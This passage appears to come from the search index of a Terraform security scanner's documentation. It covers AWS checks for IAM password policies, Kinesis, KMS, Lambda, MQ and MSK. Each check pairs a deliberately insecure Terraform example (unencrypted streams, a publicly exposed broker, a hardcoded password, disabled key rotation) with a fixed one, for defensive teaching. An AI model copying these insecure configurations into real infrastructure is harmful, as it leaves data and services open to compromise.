aws-iam-no-user-attached-policies check. <pre><code>resource \"aws_iam_group\" \"developers\" {\n  name = \"developers\"\n  path = \"/users/\"\n}\n\nresource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_group_membership\" \"devteam\" {\n  name = \"developers-team\"\n\n  users = [\n    aws_iam_user.jim.name,\n  ]\n\n  group = aws_iam_group.developers.name\n}\n\nresource \"aws_iam_group_policy\" \"ec2policy\" {\n  name = \"test\"\n  group = aws_iam_group.developers.name\n\n  policy = &lt;&lt;EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/no-user-attached-policies/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_user</p> </li> <li> <p>https://console.aws.amazon.com/iam/</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/require-lowercase-in-passwords/","text":"","title":"IAM Password policy should have requirement for at least one lowercase character."},{"location":"checks/aws/iam/require-lowercase-in-passwords/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/require-lowercase-in-passwords/#explanation","text":"<p>IAM account password policies should ensure that passwords content including at least one lowercase character.</p>","title":"Explanation"},{"location":"checks/aws/iam/require-lowercase-in-passwords/#possible-impact","text":"<p>Short, simple passwords are easier to compromise</p>","title":"Possible Impact"},{"location":"checks/aws/iam/require-lowercase-in-passwords/#suggested-resolution","text":"<p>Enforce longer, more complex passwords in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/require-lowercase-in-passwords/#insecure-example","text":"<p>The following example will fail the aws-iam-require-lowercase-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"bad_example\" {\n    # ...\n    # require_lowercase_characters not set\n    # ...\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/require-lowercase-in-passwords/#secure-example","text":"<p>The following example will pass the aws-iam-require-lowercase-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"good_example\" {\n    # ...\n    require_lowercase_characters = true\n    # ...\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/require-lowercase-in-passwords/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/require-numbers-in-passwords/","text":"","title":"IAM Password policy should have requirement for at least one number in the password."},{"location":"checks/aws/iam/require-numbers-in-passwords/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/require-numbers-in-passwords/#explanation","text":"<p>IAM account password policies should ensure that passwords content including at least one number.</p>","title":"Explanation"},{"location":"checks/aws/iam/require-numbers-in-passwords/#possible-impact","text":"<p>Short, simple passwords are easier to compromise</p>","title":"Possible Impact"},{"location":"checks/aws/iam/require-numbers-in-passwords/#suggested-resolution","text":"<p>Enforce longer, more complex passwords in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/require-numbers-in-passwords/#insecure-example","text":"<p>The following example will fail the aws-iam-require-numbers-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"bad_example\" {\n    # ...\n    # require_numbers not set\n    # ...\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/require-numbers-in-passwords/#secure-example","text":"<p>The following example will pass the aws-iam-require-numbers-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"good_example\" {\n    # ...\n    require_numbers = true\n    # ...\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/require-numbers-in-passwords/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/require-symbols-in-passwords/","text":"","title":"IAM Password policy should have requirement for at least one symbol in the password."},{"location":"checks/aws/iam/require-symbols-in-passwords/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/require-symbols-in-passwords/#explanation","text":"<p>IAM account password policies should ensure that passwords content including a symbol.</p>","title":"Explanation"},{"location":"checks/aws/iam/require-symbols-in-passwords/#possible-impact","text":"<p>Short, simple passwords are easier to compromise</p>","title":"Possible Impact"},{"location":"checks/aws/iam/require-symbols-in-passwords/#suggested-resolution","text":"<p>Enforce longer, more complex passwords in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/require-symbols-in-passwords/#insecure-example","text":"<p>The following example will fail the aws-iam-require-symbols-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"bad_example\" {\n    # ...\n    # require_symbols not set\n    # ...\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/require-symbols-in-passwords/#secure-example","text":"<p>The following example will pass the aws-iam-require-symbols-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"good_example\" {\n    # ...\n    require_symbols = true\n    # ...\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/require-symbols-in-passwords/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/require-uppercase-in-passwords/","text":"","title":"IAM Password policy should have requirement for at least one uppercase character."},{"location":"checks/aws/iam/require-uppercase-in-passwords/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/require-uppercase-in-passwords/#explanation","text":"<p>, IAM account password policies should ensure that passwords content including at least one uppercase character.</p>","title":"Explanation"},{"location":"checks/aws/iam/require-uppercase-in-passwords/#possible-impact","text":"<p>Short, simple passwords are easier to compromise</p>","title":"Possible Impact"},{"location":"checks/aws/iam/require-uppercase-in-passwords/#suggested-resolution","text":"<p>Enforce longer, more complex passwords in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/require-uppercase-in-passwords/#insecure-example","text":"<p>The following example will fail the aws-iam-require-uppercase-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"bad_example\" {\n    # ...\n    # require_uppercase_characters not set\n    # ...\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/require-uppercase-in-passwords/#secure-example","text":"<p>The following example will pass the aws-iam-require-uppercase-in-passwords check. <pre><code> resource \"aws_iam_account_password_policy\" \"good_example\" {\n    # ...\n    require_uppercase_characters = true\n    # ...\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/require-uppercase-in-passwords/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/set-max-password-age/","text":"","title":"IAM Password policy should have expiry less than or equal to 90 days."},{"location":"checks/aws/iam/set-max-password-age/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/set-max-password-age/#explanation","text":"<p>IAM account password policies should have a maximum age specified. </p> <p>The account password policy should be set to expire passwords after 90 days or less.</p>","title":"Explanation"},{"location":"checks/aws/iam/set-max-password-age/#possible-impact","text":"<p>Long life password increase the likelihood of a password eventually being compromised</p>","title":"Possible Impact"},{"location":"checks/aws/iam/set-max-password-age/#suggested-resolution","text":"<p>Limit the password duration with an expiry in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/set-max-password-age/#insecure-example","text":"<p>The following example will fail the aws-iam-set-max-password-age check. <pre><code>resource \"aws_iam_account_password_policy\" \"bad_example\" {\n    # ...\n    # max_password_age not set\n    # ...\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/set-max-password-age/#secure-example","text":"<p>The following example will pass the aws-iam-set-max-password-age check. <pre><code>resource \"aws_iam_account_password_policy\" \"good_example\" {\n    max_password_age = 90\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/set-max-password-age/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/set-minimum-password-length/","text":"","title":"IAM Password policy should have minimum password length of 14 or more characters."},{"location":"checks/aws/iam/set-minimum-password-length/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/set-minimum-password-length/#explanation","text":"<p>IAM account password policies should ensure that passwords have a minimum length. </p> <p>The account password policy should be set to enforce minimum password length of at least 14 characters.</p>","title":"Explanation"},{"location":"checks/aws/iam/set-minimum-password-length/#possible-impact","text":"<p>Short, simple passwords are easier to compromise</p>","title":"Possible Impact"},{"location":"checks/aws/iam/set-minimum-password-length/#suggested-resolution","text":"<p>Enforce longer, more complex passwords in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/set-minimum-password-length/#insecure-example","text":"<p>The following example will fail the aws-iam-set-minimum-password-length check. <pre><code>resource \"aws_iam_account_password_policy\" \"bad_example\" {\n    # ...\n    # minimum_password_length not set\n    # ...\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/set-minimum-password-length/#secure-example","text":"<p>The following example will pass the aws-iam-set-minimum-password-length check. <pre><code>resource \"aws_iam_account_password_policy\" \"good_example\" {\n    minimum_password_length = 14\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/set-minimum-password-length/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/kinesis/","text":"","title":"kinesis"},{"location":"checks/aws/kinesis/#checks","text":"<ul> <li>enable-in-transit-encryption Kinesis stream is unencrypted.</li> </ul>","title":"Checks"},{"location":"checks/aws/kinesis/enable-in-transit-encryption/","text":"","title":"Kinesis stream is unencrypted."},{"location":"checks/aws/kinesis/enable-in-transit-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/kinesis/enable-in-transit-encryption/#explanation","text":"<p>Kinesis streams should be encrypted to ensure sensitive data is kept private. Additionally, non-default KMS keys should be used so granularity of access control can be ensured.</p>","title":"Explanation"},{"location":"checks/aws/kinesis/enable-in-transit-encryption/#possible-impact","text":"<p>Intercepted data can be read in transit</p>","title":"Possible Impact"},{"location":"checks/aws/kinesis/enable-in-transit-encryption/#suggested-resolution","text":"<p>Enable in transit encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/kinesis/enable-in-transit-encryption/#insecure-example","text":"<p>The following example will fail the aws-kinesis-enable-in-transit-encryption check. <pre><code> resource \"aws_kinesis_stream\" \"bad_example\" {\n    encryption_type = \"NONE\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/kinesis/enable-in-transit-encryption/#secure-example","text":"<p>The following example will pass the aws-kinesis-enable-in-transit-encryption check. <pre><code> resource \"aws_kinesis_stream\" \"good_example\" {\n    encryption_type = \"KMS\"\n    kms_key_id = \"my/special/key\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/kinesis/enable-in-transit-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kinesis_stream#encryption_type</p> </li> <li> <p>https://docs.aws.amazon.com/streams/latest/dev/server-side-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/kms/","text":"","title":"kms"},{"location":"checks/aws/kms/#checks","text":"<ul> <li>auto-rotate-keys A KMS key is not configured to auto-rotate.</li> </ul>","title":"Checks"},{"location":"checks/aws/kms/auto-rotate-keys/","text":"","title":"A KMS key is not configured to auto-rotate."},{"location":"checks/aws/kms/auto-rotate-keys/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/kms/auto-rotate-keys/#explanation","text":"<p>You should configure your KMS keys to auto rotate to maintain security and defend against compromise.</p>","title":"Explanation"},{"location":"checks/aws/kms/auto-rotate-keys/#possible-impact","text":"<p>Long life KMS keys increase the attack surface when compromised</p>","title":"Possible Impact"},{"location":"checks/aws/kms/auto-rotate-keys/#suggested-resolution","text":"<p>Configure KMS key to auto rotate</p>","title":"Suggested Resolution"},{"location":"checks/aws/kms/auto-rotate-keys/#insecure-example","text":"<p>The following example will fail the aws-kms-auto-rotate-keys check. <pre><code> resource \"aws_kms_key\" \"bad_example\" {\n    enable_key_rotation = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/kms/auto-rotate-keys/#secure-example","text":"<p>The following example will pass the aws-kms-auto-rotate-keys check. <pre><code> resource \"aws_kms_key\" \"good_example\" {\n    enable_key_rotation = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/kms/auto-rotate-keys/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kms_key#enable_key_rotation</p> </li> <li> <p>https://docs.aws.amazon.com/kms/latest/developerguide/rotate-keys.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/lambda/","text":"","title":"lambda"},{"location":"checks/aws/lambda/#checks","text":"<ul> <li> <p>enable-tracing Lambda functions should have X-Ray tracing enabled</p> </li> <li> <p>restrict-source-arn Ensure that lambda function permission has a source arn specified</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/lambda/enable-tracing/","text":"","title":"Lambda functions should have X-Ray tracing enabled"},{"location":"checks/aws/lambda/enable-tracing/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/lambda/enable-tracing/#explanation","text":"<p>X-Ray tracing enables end-to-end debugging and analysis of all function activity. This will allow for identifying bottlenecks, slow downs and timeouts.</p>","title":"Explanation"},{"location":"checks/aws/lambda/enable-tracing/#possible-impact","text":"<p>Without full tracing enabled it is difficult to trace the flow of logs</p>","title":"Possible Impact"},{"location":"checks/aws/lambda/enable-tracing/#suggested-resolution","text":"<p>Enable tracing</p>","title":"Suggested Resolution"},{"location":"checks/aws/lambda/enable-tracing/#insecure-example","text":"<p>The following example will fail the aws-lambda-enable-tracing check. <pre><code> resource \"aws_iam_role\" \"iam_for_lambda\" {\n   name = \"iam_for_lambda\"\n\n   assume_role_policy = &lt;&lt;EOF\n {\n   \"Version\": \"2012-10-17\",\n   \"Statement\": [\n     {\n       \"Action\": \"sts:AssumeRole\",\n       \"Principal\": {\n         \"Service\": \"lambda.amazonaws.com\"\n       },\n       \"Effect\": \"Allow\",\n       \"Sid\": \"\"\n     }\n   ]\n }\n EOF\n }\n\n resource \"aws_lambda_function\" \"bad_example\" {\n   filename      = \"lambda_function_payload.zip\"\n   function_name = \"lambda_function_name\"\n   role          = aws_iam_role.iam_for_lambda.arn\n   handler       = \"exports.test\"\n\n   # The filebase64sha256() function is available in Terraform 0.11.12 and later\n   # For Terraform 0.11.11 and earlier, use the base64sha256() function and the file() function:\n   # source_code_hash = \"${base64sha256(file(\"lambda_function_payload.zip\"))}\"\n   source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n   runtime = \"nodejs12.x\"\n\n   environment {\n     variables = {\n       foo = \"bar\"\n     }\n   }\n   tracing_config {\n     mode = \"Passthrough\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/lambda/enable-tracing/#secure-example","text":"<p>The following example will pass the aws-lambda-enable-tracing check. <pre><code> resource \"aws_iam_role\" \"iam_for_lambda\" {\n   name = \"iam_for_lambda\"\n\n   assume_role_policy = &lt;&lt;EOF\n {\n   \"Version\": \"2012-10-17\",\n   \"Statement\": [\n     {\n       \"Action\": \"sts:AssumeRole\",\n       \"Principal\": {\n         \"Service\": \"lambda.amazonaws.com\"\n       },\n       \"Effect\": \"Allow\",\n       \"Sid\": \"\"\n     }\n   ]\n }\n EOF\n }\n\n resource \"aws_lambda_function\" \"good_example\" {\n   filename      = \"lambda_function_payload.zip\"\n   function_name = \"lambda_function_name\"\n   role          = aws_iam_role.iam_for_lambda.arn\n   handler       = \"exports.test\"\n\n   # The filebase64sha256() function is available in Terraform 0.11.12 and later\n   # For Terraform 0.11.11 and earlier, use the base64sha256() function and the file() function:\n   # source_code_hash = \"${base64sha256(file(\"lambda_function_payload.zip\"))}\"\n   source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n   runtime = \"nodejs12.x\"\n\n   environment {\n     variables = {\n       foo = \"bar\"\n     }\n   }\n   tracing_config {\n     mode = \"Active\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/lambda/enable-tracing/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_function#mode</p> </li> <li> <p>https://docs.aws.amazon.com/lambda/latest/dg/services-xray.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/lambda/restrict-source-arn/","text":"","title":"Ensure that lambda function permission has a source arn specified"},{"location":"checks/aws/lambda/restrict-source-arn/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/lambda/restrict-source-arn/#explanation","text":"<p>When the principal is an AWS service, the ARN of the specific resource within that service to grant permission to. </p> <p>Without this, any resource from principal will be granted permission \u2013 even if that resource is from another account. </p> <p>For S3, this should be the ARN of the S3 Bucket. For CloudWatch Events, this should be the ARN of the CloudWatch Events Rule. For API Gateway, this should be the ARN of the API</p>","title":"Explanation"},{"location":"checks/aws/lambda/restrict-source-arn/#possible-impact","text":"<p>Not providing the source ARN allows any resource from principal, even from other accounts</p>","title":"Possible Impact"},{"location":"checks/aws/lambda/restrict-source-arn/#suggested-resolution","text":"<p>Always provide a source arn for Lambda permissions</p>","title":"Suggested Resolution"},{"location":"checks/aws/lambda/restrict-source-arn/#insecure-example","text":"<p>The following example will fail the aws-lambda-restrict-source-arn check. <pre><code>resource \"aws_lambda_permission\" \"bad_example\" {\n    statement_id = \"AllowExecutionFromSNS\"\n    action = \"lambda:InvokeFunction\"\n    function_name = aws_lambda_function.func.function_name\n    principal = \"sns.amazonaws.com\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/lambda/restrict-source-arn/#secure-example","text":"<p>The following example will pass the aws-lambda-restrict-source-arn check. <pre><code>resource \"aws_lambda_permission\" \"good_example\" {\n    statement_id = \"AllowExecutionFromSNS\"\n    action = \"lambda:InvokeFunction\"\n    function_name = aws_lambda_function.func.function_name\n    principal = \"sns.amazonaws.com\"\n    source_arn = aws_sns_topic.default.arn\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/lambda/restrict-source-arn/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_permission</p> </li> <li> <p>https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-lambda-permission.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/mq/","text":"","title":"mq"},{"location":"checks/aws/mq/#checks","text":"<ul> <li> <p>enable-audit-logging MQ Broker should have audit logging enabled</p> </li> <li> <p>enable-general-logging MQ Broker should have general logging enabled</p> </li> <li> <p>no-public-access Ensure MQ Broker is not publicly exposed</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/mq/enable-audit-logging/","text":"","title":"MQ Broker should have audit logging enabled"},{"location":"checks/aws/mq/enable-audit-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/mq/enable-audit-logging/#explanation","text":"<p>Logging should be enabled to allow tracing of issues and activity to be investigated more fully. Logs provide additional information and context which is often invalauble during investigation</p>","title":"Explanation"},{"location":"checks/aws/mq/enable-audit-logging/#possible-impact","text":"<p>Without audit logging it is difficult to trace activity in the MQ broker</p>","title":"Possible Impact"},{"location":"checks/aws/mq/enable-audit-logging/#suggested-resolution","text":"<p>Enable audit logging</p>","title":"Suggested Resolution"},{"location":"checks/aws/mq/enable-audit-logging/#insecure-example","text":"<p>The following example will fail the aws-mq-enable-audit-logging check. <pre><code> resource \"aws_mq_broker\" \"bad_example\" {\n   broker_name = \"example\"\n\n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n\n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n\n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     audit = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/mq/enable-audit-logging/#secure-example","text":"<p>The following example will pass the aws-mq-enable-audit-logging check. <pre><code> resource \"aws_mq_broker\" \"good_example\" {\n   broker_name = \"example\"\n\n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n\n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n\n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     audit = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/mq/enable-audit-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#audit</p> </li> <li> <p>https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/configure-logging-monitoring-activemq.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/mq/enable-general-logging/","text":"","title":"MQ Broker should have general logging enabled"},{"location":"checks/aws/mq/enable-general-logging/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/mq/enable-general-logging/#explanation","text":"<p>Logging should be enabled to allow tracing of issues and activity to be investigated more fully. Logs provide additional information and context which is often invalauble during investigation</p>","title":"Explanation"},{"location":"checks/aws/mq/enable-general-logging/#possible-impact","text":"<p>Without logging it is difficult to trace issues</p>","title":"Possible Impact"},{"location":"checks/aws/mq/enable-general-logging/#suggested-resolution","text":"<p>Enable general logging</p>","title":"Suggested Resolution"},{"location":"checks/aws/mq/enable-general-logging/#insecure-example","text":"<p>The following example will fail the aws-mq-enable-general-logging check. <pre><code> resource \"aws_mq_broker\" \"bad_example\" {\n   broker_name = \"example\"\n\n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n\n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n\n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     general = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/mq/enable-general-logging/#secure-example","text":"<p>The following example will pass the aws-mq-enable-general-logging check. <pre><code> resource \"aws_mq_broker\" \"good_example\" {\n   broker_name = \"example\"\n\n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n\n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n\n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   logs {\n     general = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/mq/enable-general-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#general</p> </li> <li> <p>https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/configure-logging-monitoring-activemq.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/mq/no-public-access/","text":"","title":"Ensure MQ Broker is not publicly exposed"},{"location":"checks/aws/mq/no-public-access/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/mq/no-public-access/#explanation","text":"<p>Public access of the MQ broker should be disabled and only allow routes to applications that require access.</p>","title":"Explanation"},{"location":"checks/aws/mq/no-public-access/#possible-impact","text":"<p>Publicly accessible MQ Broker may be vulnerable to compromise</p>","title":"Possible Impact"},{"location":"checks/aws/mq/no-public-access/#suggested-resolution","text":"<p>Disable public access when not required</p>","title":"Suggested Resolution"},{"location":"checks/aws/mq/no-public-access/#insecure-example","text":"<p>The following example will fail the aws-mq-no-public-access check. <pre><code> resource \"aws_mq_broker\" \"bad_example\" {\n   broker_name = \"example\"\n\n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n\n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n\n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   publicly_accessible = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/mq/no-public-access/#secure-example","text":"<p>The following example will pass the aws-mq-no-public-access check. <pre><code> resource \"aws_mq_broker\" \"good_example\" {\n   broker_name = \"example\"\n\n   configuration {\n     id       = aws_mq_configuration.test.id\n     revision = aws_mq_configuration.test.latest_revision\n   }\n\n   engine_type        = \"ActiveMQ\"\n   engine_version     = \"5.15.0\"\n   host_instance_type = \"mq.t2.micro\"\n   security_groups    = [aws_security_group.test.id]\n\n   user {\n     username = \"ExampleUser\"\n     password = \"MindTheGap\"\n   }\n   publicly_accessible = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/mq/no-public-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#publicly_accessible</p> </li> <li> <p>https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/using-amazon-mq-securely.html#prefer-brokers-without-public-accessibility</p> </li> </ul>","title":"Links"},{"location":"checks/aws/msk/","text":"","title":"msk"},{"location":"checks/aws/msk/#checks","text":"<ul> <li> <p>enable-in-transit-encryption A MSK cluster allows unencrypted data in transit.</p> </li> <li> <p>enable-logging Ensure MSK Cluster logging is enabled</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/msk/enable-in-transit-encryption/","text":"","title":"A MSK cluster allows unencrypted data in transit."},{"location":"checks/aws/msk/enable-in-transit-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/msk/enable-in-transit-encryption/#explanation","text":"<p>Encryption should be forced for Kafka clusters, including for communication between nodes. This ensure sensitive data is kept private.</p>","title":"Explanation"},{"location":"checks/aws/msk/enable-in-transit-encryption/#possible-impact","text":"<p>Intercepted data can be read in transit</p>","title":"Possible Impact"},{"location":"checks/aws/msk/enable-in-transit-encryption/#suggested-resolution","text":"<p>Enable in transit encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/msk/enable-in-transit-encryption/#insecure-example","text":"<p>The following example will fail the aws-msk-enable-in-transit-encryption check. <pre><code> resource \"aws_msk_cluster\" \"bad_example\" {\n    encryption_info {\n        encryption_in_transit {\n            client_broker = \"TLS_PLAINTEXT\"\n            in_cluster = true\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/msk/enable-in-transit-encryption/#secure-example","text":"<p>The following example will pass the aws-msk-enable-in-transit-encryption check. <pre><code> resource \"aws_msk_cluster\" \"good_example\" {\n    encryption_info {\n        encryption_in_transit {\n            client_broker = \"TLS\"\n            in_cluster = true\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/msk/enable-in-transit-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference</p> </li> <li> <p>https://docs.aws.amazon.com/msk/latest/developerguide/msk-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/msk/enable-logging/","text":"","title":"Ensure MSK Cluster logging is enabled"},{"location":"checks/aws/msk/enable-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/msk/enable-logging/#explanation","text":"<p>Managed streaming for Kafka can log to Cloud Watch, Kinesis Firehose and S3, at least one of these locations should be logged to</p>","title":"Explanation"},{"location":"checks/aws/msk/enable-logging/#possible-impact","text":"<p>Without logging it is difficult to trace issues</p>","title":"Possible Impact"},{"location":"checks/aws/msk/enable-logging/#suggested-resolution","text":"<p>Enable logging</p>","title":"Suggested Resolution"},{"location":"checks/aws/msk/enable-logging/#insecure-example","text":"<p>The following example will fail the aws-msk-enable-logging check. <pre><code> resource \"aws_msk_cluster\" \"example\" {\n   cluster_name           = \"example\"\n   kafka_version          = \"2.4.1\"\n   number_of_broker_nodes = 3\n\n   broker_node_group_info {\n     instance_type   = \"kafka.m5.large\"\n     ebs_volume_size = 1000\n     client_subnets = [\n       aws_subnet.subnet_az1.id,\n       aws_subnet.subnet_az2.id,\n       aws_subnet.subnet_az3.id,\n     ]\n     security_groups = [aws_security_group.sg.id]\n   }\n   tags = {\n     foo = \"bar\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/msk/enable-logging/#secure-example","text":"<p>The following example will pass the aws-msk-enable-logging check. <pre><code> resource \"aws_msk_cluster\" \"example\" {\n   cluster_name           = 